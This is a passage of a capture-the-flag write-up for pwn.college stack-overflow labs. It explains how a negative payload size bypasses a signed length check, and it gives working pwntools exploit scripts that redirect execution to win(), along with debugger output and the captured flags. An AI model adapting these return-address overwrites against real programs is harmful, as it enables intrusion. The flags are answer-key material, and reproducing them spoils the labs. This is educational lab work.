| 0x00007ffcefa6df08 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffcefa6de80
- the saved frame pointer (of main) is at 0x7ffcefa6df00
- the saved return address (previously to main) is at 0x7ffcefa6df08
- the saved return address is now pointing to 0x4028dd.
- the address of win() is 0x4020f3.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
### Goodbye!
```

```
hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
###
### Welcome to /challenge/bounds-breaker-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeb0dd38b0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffeb0dd38b8 (rsp+0x0008) | 98 4a dd b0 fe 7f 00 00 | 0x00007ffeb0dd4a98 |
| 0x00007ffeb0dd38c0 (rsp+0x0010) | 88 4a dd b0 fe 7f 00 00 | 0x00007ffeb0dd4a88 |
| 0x00007ffeb0dd38c8 (rsp+0x0018) | 23 27 86 bc 01 00 00 00 | 0x00000001bc862723 |
| 0x00007ffeb0dd38d0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffeb0dd38d8 (rsp+0x0028) | 51 59 70 bc 00 00 00 00 | 0x00000000bc705951 |
| 0x00007ffeb0dd38e0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd38e8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd38f0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd38f8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3900 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3908 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3910 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3918 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3920 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3928 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3930 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3938 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3940 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3948 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffeb0dd3950 (rsp+0x00a0) | 90 49 dd b0 fe 7f 00 00 | 0x00007ffeb0dd4990 |
| 0x00007ffeb0dd3958 (rsp+0x00a8) | e0 38 dd b0 fe 7f 00 00 | 0x00007ffeb0dd38e0 |
| 0x00007ffeb0dd3960 (rsp+0x00b0) | 90 49 dd b0 fe 7f 00 00 | 0x00007ffeb0dd4990 |
| 0x00007ffeb0dd3968 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffeb0dd38b0, and our base pointer points to 0x7ffeb0dd3960.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffeb0dd38e0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 106 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffeb0dd3968, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (106 to fill the buffer,
30 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: 107
This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
Provided size is too large!
```

This challenge checks if the payload size entered by the user overflows the length of the buffer. If yes, it exits early without reading the payload.

It does hint somehting about using a two's complement but we'll se when we get there.

### `challenge()`

```
pwndbg> disassemble challenge

# --- snip ---

   0x00000000004024fc <+770>:   call   0x401180 <__isoc99_scanf@plt>
   0x0000000000402501 <+775>:   lea    rdi,[rip+0x13b0]        # 0x4038b8
   0x0000000000402508 <+782>:   call   0x401110 <puts@plt>
   0x000000000040250d <+787>:   lea    rdi,[rip+0x13e4]        # 0x4038f8
   0x0000000000402514 <+794>:   call   0x401110 <puts@plt>
   0x0000000000402519 <+799>:   lea    rdi,[rip+0x1418]        # 0x403938
   0x0000000000402520 <+806>:   call   0x401110 <puts@plt>
   0x0000000000402525 <+811>:   lea    rdi,[rip+0x144c]        # 0x403978
   0x000000000040252c <+818>:   call   0x401110 <puts@plt>
   0x0000000000402531 <+823>:   mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000402537 <+829>:   cmp    eax,0x6a
   0x000000000040253a <+832>:   jle    0x402552 <challenge+856>
   0x000000000040253c <+834>:   lea    rdi,[rip+0x1456]        # 0x403999
   0x0000000000402543 <+841>:   call   0x401110 <puts@plt>
   0x0000000000402548 <+846>:   mov    edi,0x1
   0x000000000040254d <+851>:   call   0x401190 <exit@plt>
   0x0000000000402552 <+856>:   lea    rdi,[rip+0x145f]        # 0x4039b8
   0x0000000000402559 <+863>:   call   0x401110 <puts@plt>
   0x000000000040255e <+868>:   lea    rdi,[rip+0x149b]        # 0x403a00

# --- snip ---

   0x00000000004026b3 <+1209>:  mov    eax,DWORD PTR [rbp-0x84]
   0x00000000004026b9 <+1215>:  mov    edx,eax
   0x00000000004026bb <+1217>:  mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004026bf <+1221>:  mov    rsi,rax
   0x00000000004026c2 <+1224>:  mov    edi,0x0
   0x00000000004026c7 <+1229>:  call   0x401150 <read@plt>

# --- snip ---
```

Whatever payload size we send, is stored at the address pointed to by `rbp-0x84`. 

Then the program compares that value with `0x6a`. If the value is lesser, it skips the `exit@plt` call and continues execution.

Later, the same value is moved in `rax`, and then moved into `rdx` before making the call to `read@plt`, where it is treated as the count of bytes to be read.

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

| arg0 (%rdi)     | arg1 (%rsi) | arg2 (%rdx)  | 
| :----------     | :---------- | :----------- |
| unsigned int fd | char *buf   | size_t count |

This is where the hint comes into play.

### [Two's compliment](https://en.wikipedia.org/wiki/Two%27s_complement)

It is additive inverse operation, so negative numbers are represented by the two's complement of the absolute value. Let's look at an example.

```
## Negative number: 

-1


## Absolute value: 

1 
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000001


## One's compliment: 

11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111110


## Two's complement: 

11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111110
+                                                                     1
-----------------------------------------------------------------------
11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111111
```

Therefore the 64-bit two's compliment of -1 is `0xffffffffffffffff`.

Let's look at how the program behaves if we provide the `-1` as the length of our payload size.

```
# --- snip ---

   0x0000000000402531 <+823>:   mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000402537 <+829>:   cmp    eax,0x6a
   0x000000000040253a <+832>:   jle    0x402552 <challenge+856>

# --- snip ---
```

In the above snippet, `jle` is used for signed comparison. As `-1 < 0x6a`, the condition will be satisfied, the program will not exit.

```
# --- snip ---

   0x00000000004026b3 <+1209>:  mov    eax,DWORD PTR [rbp-0x84]
   0x00000000004026b9 <+1215>:  mov    edx,eax
   0x00000000004026bb <+1217>:  mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004026bf <+1221>:  mov    rsi,rax
   0x00000000004026c2 <+1224>:  mov    edi,0x0
   0x00000000004026c7 <+1229>:  call   0x401150 <read@plt>

# --- snip ---
```

As we saw before, `edx` holds the argument which specifies the number of bytes to be read. The problem is, number of bytes can never be negative, so `read@plt` treats this argument as an unsigned integer. Thus `0xffffffffffffffff` is not interpreted as `-1` but rather as `18446744073709551615`.

```py
In [1]: 0xffffffffffffffff
Out[1]: 18446744073709551615
```

As a result of this mismatch between how `jle` and `read@plt` interpret our payload size input, we are able to pass the check, and overflow the buffer.

### `win()`

```
hacker@program-security~bounds-breaker-easy:~$ objdump --disassemble=win -M intel /challenge/bounds-breaker-easy 

/challenge/bounds-breaker-easy:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .plt.sec:

Disassembly of section .text:

00000000004020f3 <win>:
  4020f3:       f3 0f 1e fa             endbr64
  4020f7:       55                      push   rbp
  4020f8:       48 89 e5                mov    rbp,rsp
  4020fb:       48 8d 3d ee 0f 00 00    lea    rdi,[rip+0xfee]        # 4030f0 <_IO_stdin_used+0xf0>
  402102:       e8 09 f0 ff ff          call   401110 <puts@plt>
  402107:       be 00 00 00 00          mov    esi,0x0
  40210c:       48 8d 3d f9 0f 00 00    lea    rdi,[rip+0xff9]        # 40310c <_IO_stdin_used+0x10c>
  402113:       b8 00 00 00 00          mov    eax,0x0
  402118:       e8 53 f0 ff ff          call   401170 <open@plt>
  40211d:       89 05 1d 3f 00 00       mov    DWORD PTR [rip+0x3f1d],eax        # 406040 <flag_fd.5714>
  402123:       8b 05 17 3f 00 00       mov    eax,DWORD PTR [rip+0x3f17]        # 406040 <flag_fd.5714>
  402129:       85 c0                   test   eax,eax
  40212b:       79 4d                   jns    40217a <win+0x87>
  40212d:       e8 ce ef ff ff          call   401100 <__errno_location@plt>
  402132:       8b 00                   mov    eax,DWORD PTR [rax]
  402134:       89 c7                   mov    edi,eax
  402136:       e8 65 f0 ff ff          call   4011a0 <strerror@plt>
  40213b:       48 89 c6                mov    rsi,rax
  40213e:       48 8d 3d d3 0f 00 00    lea    rdi,[rip+0xfd3]        # 403118 <_IO_stdin_used+0x118>
  402145:       b8 00 00 00 00          mov    eax,0x0
  40214a:       e8 e1 ef ff ff          call   401130 <printf@plt>
  40214f:       e8 ec ef ff ff          call   401140 <geteuid@plt>
  402154:       85 c0                   test   eax,eax
  402156:       74 18                   je     402170 <win+0x7d>
  402158:       48 8d 3d e9 0f 00 00    lea    rdi,[rip+0xfe9]        # 403148 <_IO_stdin_used+0x148>
  40215f:       e8 ac ef ff ff          call   401110 <puts@plt>
  402164:       48 8d 3d 05 10 00 00    lea    rdi,[rip+0x1005]        # 403170 <_IO_stdin_used+0x170>
  40216b:       e8 a0 ef ff ff          call   401110 <puts@plt>
  402170:       bf ff ff ff ff          mov    edi,0xffffffff
  402175:       e8 16 f0 ff ff          call   401190 <exit@plt>
  40217a:       8b 05 c0 3e 00 00       mov    eax,DWORD PTR [rip+0x3ec0]        # 406040 <flag_fd.5714>
  402180:       ba 00 01 00 00          mov    edx,0x100
  402185:       48 8d 35 d4 3e 00 00    lea    rsi,[rip+0x3ed4]        # 406060 <flag.5713>
  40218c:       89 c7                   mov    edi,eax
  40218e:       e8 bd ef ff ff          call   401150 <read@plt>
  402193:       89 05 c7 3f 00 00       mov    DWORD PTR [rip+0x3fc7],eax        # 406160 <flag_length.5715>
  402199:       8b 05 c1 3f 00 00       mov    eax,DWORD PTR [rip+0x3fc1]        # 406160 <flag_length.5715>
  40219f:       85 c0                   test   eax,eax
  4021a1:       7f 2c                   jg     4021cf <win+0xdc>
  4021a3:       e8 58 ef ff ff          call   401100 <__errno_location@plt>
  4021a8:       8b 00                   mov    eax,DWORD PTR [rax]
  4021aa:       89 c7                   mov    edi,eax
  4021ac:       e8 ef ef ff ff          call   4011a0 <strerror@plt>
  4021b1:       48 89 c6                mov    rsi,rax
  4021b4:       48 8d 3d 0d 10 00 00    lea    rdi,[rip+0x100d]        # 4031c8 <_IO_stdin_used+0x1c8>
  4021bb:       b8 00 00 00 00          mov    eax,0x0
  4021c0:       e8 6b ef ff ff          call   401130 <printf@plt>
  4021c5:       bf ff ff ff ff          mov    edi,0xffffffff
  4021ca:       e8 c1 ef ff ff          call   401190 <exit@plt>
  4021cf:       8b 05 8b 3f 00 00       mov    eax,DWORD PTR [rip+0x3f8b]        # 406160 <flag_length.5715>
  4021d5:       48 98                   cdqe
  4021d7:       48 89 c2                mov    rdx,rax
  4021da:       48 8d 35 7f 3e 00 00    lea    rsi,[rip+0x3e7f]        # 406060 <flag.5713>
  4021e1:       bf 01 00 00 00          mov    edi,0x1
  4021e6:       e8 35 ef ff ff          call   401120 <write@plt>
  4021eb:       48 8d 3d 00 10 00 00    lea    rdi,[rip+0x1000]        # 4031f2 <_IO_stdin_used+0x1f2>
  4021f2:       e8 19 ef ff ff          call   401110 <puts@plt>
  4021f7:       90                      nop
  4021f8:       5d                      pop    rbp
  4021f9:       c3                      ret

Disassembly of section .fini:
```

Before we write the exploit, let's get the address of the `win()` function.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/bounds-breaker-easy')

# Initialize values
buffer_addr = 0x7ffcae8fa380
addr_of_stored_ip = 0x7ffcae8fa408
win_func_addr = 0x4020f3

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
payload_size = -1

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~bounds-breaker-easy:~$ python ~/script.py 
[+] Starting local process '/challenge/bounds-breaker-easy': pid 36721
/home/hacker/script.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to -1 bytes)!
[*] Process '/challenge/bounds-breaker-easy' stopped with exit code -11 (SIGSEGV) (pid 36721)
You sent 144 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeffbedca0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffeffbedca8 (rsp+0x0008) | 88 ee be ff fe 7f 00 00 | 0x00007ffeffbeee88 |
| 0x00007ffeffbedcb0 (rsp+0x0010) | 78 ee be ff fe 7f 00 00 | 0x00007ffeffbeee78 |
| 0x00007ffeffbedcb8 (rsp+0x0018) | 23 b7 54 7e 01 00 00 00 | 0x000000017e54b723 |
| 0x00007ffeffbedcc0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffeffbedcc8 (rsp+0x0028) | 51 e9 3e 7e ff ff ff ff | 0xffffffff7e3ee951 |
| 0x00007ffeffbedcd0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedcd8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedce0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedce8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedcf0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedcf8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd00 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd08 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd10 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd18 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd20 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd28 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd30 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd38 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd40 (rsp+0x00a0) | 41 41 41 41 90 00 00 00 | 0x0000009041414141 |
| 0x00007ffeffbedd48 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd50 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd58 (rsp+0x00b8) | f3 20 40 00 00 00 00 00 | 0x00000000004020f3 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffeffbedd50
- the saved return address (previously to main) is at 0x7ffeffbedd58
- the saved return address is now pointing to 0x4020f3.
- the address of win() is 0x4020f3.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{cqqx0Foh8TX0nmHtTa2208nl4Ry.0VN5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Bounds Breaker (Hard)

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

```
hacker@program-security~bounds-breaker-hard:~$ /challenge/bounds-breaker-hard 
###
### Welcome to /challenge/bounds-breaker-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!
aa
Goodbye!
### Goodbye!
```

* [ ] Location of buffer
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004021b5 <+0>:     endbr64
   0x00000000004021b9 <+4>:     push   rbp
   0x00000000004021ba <+5>:     mov    rbp,rsp
   0x00000000004021bd <+8>:     sub    rsp,0xa0
   0x00000000004021c4 <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x00000000004021ca <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x00000000004021d1 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x00000000004021d8 <+35>:    mov    QWORD PTR [rbp-0x70],0x0
   0x00000000004021e0 <+43>:    mov    QWORD PTR [rbp-0x68],0x0
   0x00000000004021e8 <+51>:    mov    QWORD PTR [rbp-0x60],0x0
   0x00000000004021f0 <+59>:    mov    QWORD PTR [rbp-0x58],0x0
   0x00000000004021f8 <+67>:    mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000402200 <+75>:    mov    QWORD PTR [rbp-0x48],0x0
   0x0000000000402208 <+83>:    mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000402210 <+91>:    mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000402218 <+99>:    mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000402220 <+107>:   mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000402228 <+115>:   mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000402230 <+123>:   mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000402238 <+131>:   mov    DWORD PTR [rbp-0x10],0x0
   0x000000000040223f <+138>:   lea    rax,[rbp-0x70]
   0x0000000000402243 <+142>:   mov    QWORD PTR [rbp-0x8],rax
   0x0000000000402247 <+146>:   mov    DWORD PTR [rbp-0x74],0x0
   0x000000000040224e <+153>:   lea    rdi,[rip+0xeb7]        # 0x40310c
   0x0000000000402255 <+160>:   mov    eax,0x0
   0x000000000040225a <+165>:   call   0x401130 <printf@plt>
   0x000000000040225f <+170>:   lea    rax,[rbp-0x74]
   0x0000000000402263 <+174>:   mov    rsi,rax
   0x0000000000402266 <+177>:   lea    rdi,[rip+0xeae]        # 0x40311b
   0x000000000040226d <+184>:   mov    eax,0x0
   0x0000000000402272 <+189>:   call   0x401180 <__isoc99_scanf@plt>
   0x0000000000402277 <+194>:   mov    eax,DWORD PTR [rbp-0x74]
   0x000000000040227a <+197>:   cmp    eax,0x64
   0x000000000040227d <+200>:   jle    0x402295 <challenge+224>
   0x000000000040227f <+202>:   lea    rdi,[rip+0xe98]        # 0x40311e
   0x0000000000402286 <+209>:   call   0x401110 <puts@plt>
   0x000000000040228b <+214>:   mov    edi,0x1
   0x0000000000402290 <+219>:   call   0x401190 <exit@plt>
   0x0000000000402295 <+224>:   mov    eax,DWORD PTR [rbp-0x74]
   0x0000000000402298 <+227>:   mov    esi,eax
   0x000000000040229a <+229>:   lea    rdi,[rip+0xe9f]        # 0x403140
   0x00000000004022a1 <+236>:   mov    eax,0x0
   0x00000000004022a6 <+241>:   call   0x401130 <printf@plt>
   0x00000000004022ab <+246>:   mov    eax,DWORD PTR [rbp-0x74]
   0x00000000004022ae <+249>:   mov    edx,eax
   0x00000000004022b0 <+251>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004022b4 <+255>:   mov    rsi,rax
   0x00000000004022b7 <+258>:   mov    edi,0x0
   0x00000000004022bc <+263>:   call   0x401150 <read@plt>
   0x00000000004022c1 <+268>:   mov    DWORD PTR [rbp-0xc],eax
   0x00000000004022c4 <+271>:   cmp    DWORD PTR [rbp-0xc],0x0
   0x00000000004022c8 <+275>:   jns    0x4022f6 <challenge+321>
   0x00000000004022ca <+277>:   call   0x401100 <__errno_location@plt>
   0x00000000004022cf <+282>:   mov    eax,DWORD PTR [rax]
   0x00000000004022d1 <+284>:   mov    edi,eax
   0x00000000004022d3 <+286>:   call   0x4011a0 <strerror@plt>
   0x00000000004022d8 <+291>:   mov    rsi,rax
   0x00000000004022db <+294>:   lea    rdi,[rip+0xe86]        # 0x403168
   0x00000000004022e2 <+301>:   mov    eax,0x0
   0x00000000004022e7 <+306>:   call   0x401130 <printf@plt>
   0x00000000004022ec <+311>:   mov    edi,0x1
   0x00000000004022f1 <+316>:   call   0x401190 <exit@plt>
   0x00000000004022f6 <+321>:   lea    rdi,[rip+0xe8f]        # 0x40318c
   0x00000000004022fd <+328>:   call   0x401110 <puts@plt>
   0x0000000000402302 <+333>:   mov    eax,0x0
   0x0000000000402307 <+338>:   leave
   0x0000000000402308 <+339>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+263` right before `read@plt` is called.

```
pwndbg> break *(challenge+263)
Breakpoint 1 at 0x4022bc
```

```
pwndbg> run
Starting program: /challenge/bounds-breaker-hard 
###
### Welcome to /challenge/bounds-breaker-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!

Breakpoint 1, 0x00000000004022bc in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────
 RAX  0x7ffc2db73b70 ◂— 0
 RBX  0x4023f0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  2
 RDI  0
 RSI  0x7ffc2db73b70 ◂— 0
 R8   0x23
 R9   0x23
 R10  0x40315b ◂— ' bytes)!\n'
 R11  0x246
 R12  0x4011b0 (_start) ◂— endbr64 
 R13  0x7ffc2db74d00 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc2db73be0 —▸ 0x7ffc2db74c10 ◂— 0
 RSP  0x7ffc2db73b40 ◂— 1
 RIP  0x4022bc (challenge+263) ◂— call read@plt
────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────
 ► 0x4022bc <challenge+263>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffc2db73b70 ◂— 0
        nbytes: 2
 
   0x4022c1 <challenge+268>    mov    dword ptr [rbp - 0xc], eax
   0x4022c4 <challenge+271>    cmp    dword ptr [rbp - 0xc], 0
   0x4022c8 <challenge+275>    jns    challenge+321               <challenge+321>
 
   0x4022ca <challenge+277>    call   __errno_location@plt        <__errno_location@plt>
 
   0x4022cf <challenge+282>    mov    eax, dword ptr [rax]
   0x4022d1 <challenge+284>    mov    edi, eax
   0x4022d3 <challenge+286>    call   strerror@plt                <strerror@plt>
 
   0x4022d8 <challenge+291>    mov    rsi, rax
   0x4022db <challenge+294>    lea    rdi, [rip + 0xe86]     RDI => 0x403168 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x4022e2 <challenge+301>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffc2db73b40 ◂— 1
01:0008│-098     0x7ffc2db73b48 —▸ 0x7ffc2db74d18 —▸ 0x7ffc2db7668b ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-090     0x7ffc2db73b50 —▸ 0x7ffc2db74d08 —▸ 0x7ffc2db7666c ◂— '/challenge/bounds-breaker-hard'
03:0018│-088     0x7ffc2db73b58 ◂— 0x19c59d951
04:0020│-080     0x7ffc2db73b60 ◂— 0xd68 /* 'h\r' */
05:0028│-078     0x7ffc2db73b68 ◂— 0x20000000a /* '\n' */
06:0030│ rax rsi 0x7ffc2db73b70 ◂— 0
07:0038│-068     0x7ffc2db73b78 ◂— 0
───────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4022bc challenge+263
   1         0x4023cf main+198
   2   0x7c6e9c531083 __libc_start_main+243
   3         0x4011de _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

* [x] Location of buffer: `0x7ffc2db73b70`
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffc2db73bf0:
 rip = 0x4022bc in challenge; saved rip = 0x4023cf
 called by frame at 0x7ffc2db74c20
 Arglist at 0x7ffc2db73be0, args: 
 Locals at 0x7ffc2db73be0, Previous frame's sp is 0x7ffc2db73bf0
 Saved registers:
  rbp at 0x7ffc2db73be0, rip at 0x7ffc2db73be8
```

* [x] Location of buffer: `0x7ffc2db73b70`
* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
* [ ] Location of `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4020ae in a file compiled without debugging.
```

* [x] Location of buffer: `0x7ffc2db73b70`
* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
* [x] Location of `win()`: `0x4020ae`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/bounds-breaker-hard')

# Initialize values
buffer_addr = 0x7ffc2db73b70
addr_of_stored_ip = 0x7ffc2db73be8
win_func_addr = 0x4020ae

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
payload_size = -1

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~bounds-breaker-hard:~$ python ~/script.py 
[+] Starting local process '/challenge/bounds-breaker-hard': pid 21809
/home/hacker/script.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to -1 bytes)!
[*] Process '/challenge/bounds-breaker-hard' stopped with exit code -11 (SIGSEGV) (pid 21809)
Goodbye!
You win! Here is your flag:
pwn.college{c2QK8MySIcrTr1cBw5ue9GWyXo8.0lN5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Casting Catastrophe (Easy)

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!

```
hacker@program-security~casting-catastrophe-easy:~$ /challenge/casting-catastrophe-easy 
###
### Welcome to /challenge/casting-catastrophe-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc78442700 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffc78442708 (rsp+0x0008) | e8 38 44 78 fc 7f 00 00 | 0x00007ffc784438e8 |
| 0x00007ffc78442710 (rsp+0x0010) | d8 38 44 78 fc 7f 00 00 | 0x00007ffc784438d8 |
| 0x00007ffc78442718 (rsp+0x0018) | 23 17 e1 2f 01 00 00 00 | 0x000000012fe11723 |
| 0x00007ffc78442720 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffc78442728 (rsp+0x0028) | 51 49 cb 2f c7 78 00 00 | 0x000078c72fcb4951 |
| 0x00007ffc78442730 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442738 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
